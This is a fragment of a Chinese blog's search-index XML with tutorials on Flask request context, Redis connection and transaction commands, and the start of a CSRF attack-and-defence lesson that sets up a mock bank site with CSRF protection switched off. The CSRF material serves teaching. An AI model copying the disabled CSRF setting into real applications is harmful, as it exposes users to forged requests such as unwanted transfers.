class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的调用有写繁琐,每次都需要传入<code>y=2</code>,我们可以定义一个新的函数,把<code>y=2</code> 作为默认值,</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">double</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> multiply<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 现在在调用这个函数</span><span class="token operator">>></span><span class="token operator">></span> double<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token number">6</span><span class="token operator">>></span><span class="token operator">></span> double<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token number">8</span><span class="token operator">>></span><span class="token operator">></span> double<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>partial</code> 可以完成如上的任务</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> partialdouble <span class="token operator">=</span> partial<span class="token punctuation">(</span>multiply<span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>partial</code> 接收函数 <code>multiply</code> 作为参数，固定 <code>multiply</code> 的参数 <code>y=2</code>，并返回一个新的函数给 <code>double</code>，这跟我们自己定义 <code>double</code> 函数的效果是一样的。</p><p>所以,简单而言,<code>partial</code> 函数的功能就是:把一个函数的某些参数给固定住,返回一个新的函数.</p><p>所以上面的也很好理解:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_lookup_req_object</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    top <span class="token operator">=</span> _request_ctx_stack<span class="token punctuation">.</span>top    <span class="token keyword">if</span> top <span class="token keyword">is</span> None<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>_request_ctx_err_msg<span class="token punctuation">)</span>    <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>top<span class="token punctuation">,</span> name<span class="token punctuation">)</span>_request_ctx_stack <span class="token operator">=</span> LocalStack<span class="token punctuation">(</span><span class="token punctuation">)</span>request <span class="token operator">=</span> LocalProxy<span class="token punctuation">(</span>partial<span class="token punctuation">(</span>_lookup_req_object<span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ==> request = LocalProxy(_lookup_req_object('request'))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>典型的<code>Flask</code>结构:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>requestapp<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">)</span>     <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样访问的是同一个<code>request</code> 对象,而访问到的网页是两个,获取到的值应该是不一样的.这是因为<code>request</code> 是一个<code>LocalProxy</code> 对象,它会更新<code>LocalStack</code></p><pre class="line-numbers language-python"><code class="language-python">request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span> request1<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        request2<span class="token punctuation">.</span>artgs<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span> 实现了 LocalStack的自动更新<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">from</span> flask<span class="token punctuation">.</span>globals <span class="token keyword">import</span> _app_ctx_stack<span class="token punctuation">,</span> _request_ctx_stackapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 堆栈结构</span><span class="token keyword">print</span><span class="token punctuation">(</span>_app_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>_app_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>_app_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>_request_ctx_stack<span class="token punctuation">.</span>_local<span class="token punctuation">.</span>__storage__<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'This is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""从浏览器访问:http://127.0.0.1:5000/?username=pythonhttp://127.0.0.1:5000/login/?username=python得到:{&lt;greenlet.greenlet object at 0x7f4e6c24fd60>: {'stack': [&lt;flask.ctx.AppContext object at 0x7f4e6c274950>]}}{&lt;greenlet.greenlet object at 0x7f4e6c24fd60>: {'stack': [&lt;RequestContext 'http://127.0.0.1:5000/?username=python' [GET] of app>]}}127.0.0.1  "GET /?username=python HTTP/1.1" 200 -{&lt;greenlet.greenlet object at 0x7f4e6c24ff70>: {'stack': [&lt;flask.ctx.AppContext object at 0x7f4e6c274f90>]}}{&lt;greenlet.greenlet object at 0x7f4e6c24ff70>: {'stack': [&lt;RequestContext 'http://127.0.0.1:5000/login/?username=python' [GET] of app>]}}127.0.0.1  "GET /login/?username=python HTTP/1.1" 200 -"""</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上实现了不同的上下文内容.</p></blockquote><h4 id="2-g全局变量"><a href="#2-g全局变量" class="headerlink" title="2.g全局变量"></a>2.<code>g</code>全局变量</h4><blockquote><p>对于 g 这个上下文变量来说，其用途会更加广泛些。比如说如果对于某个请求，我们几个视图函数都需要用到一个前端传递过来的变量，那么就可以把它保存到 g 变量当中</p><pre class="line-numbers language-python"><code class="language-python">g<span class="token punctuation">.</span>name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样，其他的视图函数就可以在同一个请求中直接使用 g.name 来访问，而不用每次都调用 request 了。而这种特性往往和请求钩子相结合使用，可以极大的提高代码的简洁性</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Flask Session </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis连接</title>
      <link href="/posts/42949.html"/>
      <url>/posts/42949.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="redis连接"><a href="#redis连接" class="headerlink" title="redis连接"></a><code>redis</code>连接</h2><blockquote><p><code>redis</code>连接命令主要用来连接<code>redis</code> 服务器</p></blockquote><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><blockquote><ul><li><code>auth &#39;password&#39;</code> : 通过设置配置文件中 <code>requirepass</code> 项的值(使用命令 <code>CONFIG SET requirepass password</code> )，可以使用密码来保护 <code>Redis</code> 服务器.如果开启了密码保护的话，在每次连接 <code>Redis</code> 服务器之后，就要使用 <code>AUTH</code> 命令解锁，解锁之后才能使用其他 <code>Redis</code> 命令.</li></ul><pre class="line-numbers language-bash"><code class="language-bash">redis<span class="token operator">></span> CONFIG SET requirepass secret_password   <span class="token comment" spellcheck="true"># 将密码设置为 secret_password</span>OKredis<span class="token operator">></span> QUIT                                     <span class="token comment" spellcheck="true"># 退出再连接，让新密码对客户端生效</span>$ redisredis<span class="token operator">></span> PING                                     <span class="token comment" spellcheck="true"># 未验证密码，操作被拒绝</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> ERR operation not permittedredis<span class="token operator">></span> AUTH wrong_password_testing              <span class="token comment" spellcheck="true"># 尝试输入错误的密码</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> ERR invalid passwordredis<span class="token operator">></span> AUTH secret_password                     <span class="token comment" spellcheck="true"># 输入正确的密码</span>OKredis<span class="token operator">></span> PING                                     <span class="token comment" spellcheck="true"># 密码验证成功，可以正常操作命令了</span>PONG<span class="token comment" spellcheck="true"># 清空密码</span>redis<span class="token operator">></span> CONFIG SET requirepass <span class="token string">""</span>   <span class="token comment" spellcheck="true"># 通过将密码设为空字符来清空密码</span>OKredis<span class="token operator">></span> QUIT$ redis                            <span class="token comment" spellcheck="true"># 重新进入客户端</span>redis<span class="token operator">></span> PING                        <span class="token comment" spellcheck="true"># 执行命令不再需要密码，清空密码操作成功</span>PONG<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>echo &#39;message&#39;</code> :打印一个特定的信息 <code>message</code> ，测试时使用</li></ul><pre class="line-numbers language-bash"><code class="language-bash">redis<span class="token operator">></span> ECHO <span class="token string">"Hello Moto"</span><span class="token string">"Hello Moto"</span>redis<span class="token operator">></span> ECHO <span class="token string">"Goodbye Moto"</span><span class="token string">"Goodbye Moto"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>ping</code> :使用客户端像服务器发送一个<code>ping</code>,如果服务器正常,返回<code>pong</code> .通常用于测试与服务器的连接是否仍然生效，或者用于测量延迟值</li><li><code>quit</code>:请求服务器关闭与当前客户端的连接.</li><li><code>select</code> :切换指定的数据库,数据库索引号 <code>index</code> 用数字值指定,以 <code>0</code> 作为起始索引值(默认).</li></ul><pre class="line-numbers language-bash"><code class="language-bash">redis<span class="token operator">></span> SET db_number 0         <span class="token comment" spellcheck="true"># 默认使用 0 号数据库</span>OKredis<span class="token operator">></span> SELECT 1                <span class="token comment" spellcheck="true"># 使用 1 号数据库</span>OKredis<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">></span> GET db_number        <span class="token comment" spellcheck="true"># 已经切换到 1 号数据库，注意 Redis 现在的命令提示符多了个 [1]</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span>redis<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">></span> SET db_number 1OKredis<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">></span> GET db_number<span class="token string">"1"</span>redis<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">></span> SELECT 3             <span class="token comment" spellcheck="true"># 再切换到 3 号数据库</span>OKredis<span class="token punctuation">[</span>3<span class="token punctuation">]</span><span class="token operator">></span>                      <span class="token comment" spellcheck="true"># 提示符从 [1] 改变成了 [3]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis事务</title>
      <link href="/posts/25854.html"/>
      <url>/posts/25854.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="redis-事务"><a href="#redis-事务" class="headerlink" title="redis 事务"></a><code>redis</code> 事务</h2><blockquote><p><code>redis</code>事务可以一次执行多个命令,并且有3个重要的保证:</p><ul><li>批量操作中在发送<code>exec</code> 命令前被放入到队列缓存</li><li>收到<code>exec</code>命令后进入事务操作.事务中任意命令执行失败,其他命令仍然被执行.</li><li>在事务执行过程中,其他客户端提交的命令不会插入到事务执行命令序列中.</li></ul><p>一个事务从开始到执行会经历3个阶段</p><ul><li>开始事务</li><li>命令入队</li><li>执行事务</li></ul></blockquote><h3 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a>1.常用命令</h3><blockquote><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>discard</code></td><td>取消事务,放弃执行事务内的所有命令</td></tr><tr><td><code>exec</code></td><td>执行所有事务内的命令</td></tr><tr><td><code>multi</code></td><td>标记一个事务的开始</td></tr><tr><td><code>unwatch</code></td><td>取消<code>watch</code>命令对所有<code>key</code> 的监视</td></tr><tr><td><code>watch key [key]</code></td><td>监视一个或多个<code>key</code>,如果在事务执行之前<code>key</code>被<br>其他命令改动,那么事务被打断</td></tr></tbody></table></blockquote><h3 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h3><blockquote><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 以 multi 开始一个事务,然后将多个命令入队到事务中,最后由 exec 触发事务.</span>127.0.0.1:6379<span class="token operator">></span> MULTIOK127.0.0.1:6379<span class="token operator">></span> <span class="token keyword">set</span> mykey <span class="token string">'this is a test'</span>QUEUED127.0.0.1:6379<span class="token operator">></span> get mykeyQUEUED127.0.0.1:6379<span class="token operator">></span> hset myhashkey field1 <span class="token function">test</span>QUEUED127.0.0.1:6379<span class="token operator">></span> hget myhashkey field1QUEUED127.0.0.1:6379<span class="token operator">></span> <span class="token function">exec</span>1<span class="token punctuation">)</span> OK2<span class="token punctuation">)</span> <span class="token string">"this is a test"</span>3<span class="token punctuation">)</span> <span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 14<span class="token punctuation">)</span> <span class="token string">"test"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>单个<code>redis</code> 命令的执行是原子性的,但是<code>redis</code>事务不支持原子,不支持回滚操作.事务相当于一个打包的批量执行脚本.但批量指令并非原子化的操作,中间某条指令的失败不会导致前面已做指令的回滚,也不会造成后续的指令不做.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF攻击和防护</title>
      <link href="/posts/30503.html"/>
      <url>/posts/30503.html</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF攻击和防护"><a href="#CSRF攻击和防护" class="headerlink" title="CSRF攻击和防护"></a>CSRF攻击和防护</h2><blockquote><p>前期我们的项目中都是显示的关闭<code>CSRF</code>的.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># config.py</span><span class="token comment" spellcheck="true"># 显式关闭CSRF</span>WTF_CSRF_ENABLED <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是<code>CSRF</code>攻击确实客观上存在的,现在我们来讨论一下<code>CSRF</code></p></blockquote><h3 id="1-什么是CSRF"><a href="#1-什么是CSRF" class="headerlink" title="1.什么是CSRF"></a>1.什么是CSRF</h3><blockquote><p><code>CSRF</code>跨站请求伪造,这是一种利用<code>cookie</code>每次请求都会带上的特性的攻击.</p><p>简单来说,攻击者盗用了你的身份,以你的名义发送恶意请求,对服务器来说这个请求是完全合法的,但是却完成了攻击者所期望的一个操作,比如以你的名义发送邮件,发消息,盗取你的账号,添加系统管理员,甚至于购买商品,虚拟货币转账转账等.</p><p>比如如下攻击:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-14/1602679848546-CSRF.png" alt="csrf"></p><p>当然这需要攻击者研究确切的<code>API</code> 来操作,并且需要用户在登陆<code>mybank.com</code>后访问邪恶网站,尽管概率比较低,但是这种攻击却广泛存在.</p></blockquote><h3 id="2-攻击实例-mybank-com"><a href="#2-攻击实例-mybank-com" class="headerlink" title="2.攻击实例(mybank.com)"></a>2.攻击实例(<code>mybank.com</code>)</h3><blockquote><p>利用<code>Flask</code>实现<code>www.mybank.com</code> 和<code>www.evel-website.com</code> 网站,模拟<code>CSRF</code>攻击过程.</p><p>先实现第一个网站<code>www.mybank.com</code></p><p>代码参考<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T23</code></p></blockquote><h4 id="1-实现网站的基本框架"><a href="#1-实现网站的基本框架" class="headerlink" title="1.实现网站的基本框架"></a>1.实现网站的基本框架</h4><blockquote><p><code>www.mybank.com</code> 要实现如下功能</p><pre class="line-numbers language-bash"><code class="language-bash">www.mybank.com├── base.html          <span class="token comment" spellcheck="true"># 网站模板</span>├── index.html        <span class="token comment" spellcheck="true"># 网站首页</span>├── login.html        <span class="token comment" spellcheck="true"># 登陆页面</span>├── personal.html     <span class="token comment" spellcheck="true"># 查看个人信息和余额情况</span>├── regist.html            <span class="token comment" spellcheck="true"># 注册页面</span>├── save_money.html    <span class="token comment" spellcheck="true"># 存钱页面</span>├── logout.html    <span class="token comment" spellcheck="true"># 退出页面</span>└── transfer.html              <span class="token comment" spellcheck="true"># 转账页面</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本实现网站的<code>GET</code>请求都能访问到页面.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> config<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span>viewsapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 首页</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 注册页</span><span class="token keyword">class</span> <span class="token class-name">RegisterView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 登录页</span><span class="token keyword">class</span> <span class="token class-name">LoginView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 个人信息页面</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/personal/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">personal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'personal.html'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 存钱页面</span><span class="token keyword">class</span> <span class="token class-name">SaveMoneyView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'savemoney.html'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 转账页面</span><span class="token keyword">class</span> <span class="token class-name">TransferView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'transfer.html'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 退出</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 注册URL</span>app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> view_func<span class="token operator">=</span>LoginView<span class="token punctuation">.</span>as_view<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span>view_func<span class="token operator">=</span>RegisterView<span class="token punctuation">.</span>as_view<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/savemoney/'</span><span class="token punctuation">,</span>view_func<span class="token operator">=</span>SaveMoneyView<span class="token punctuation">.</span>as_view<span class="token punctuation">(</span><span class="token string">'savemoney'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/transfer/'</span><span class="token punctuation">,</span>view_func<span class="token operator">=</span>TransferView<span class="token punctuation">.</span>as_view<span class="token punctuation">(</span><span class="token string">'transfer'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>搭建基本的<code>html</code>页面,这里把以前的知识串联一下,使用<code>base.html</code>模板来支撑所有的页面.</p></blockquote><h4 id="2-前端页面"><a href="#2-前端页面" class="headerlink" title="2.前端页面"></a>2.前端页面</h4><blockquote><p>使用<code>jinja</code>渲染页面</p></blockquote><h5 id="1-base-html"><a href="#1-base-html" class="headerlink" 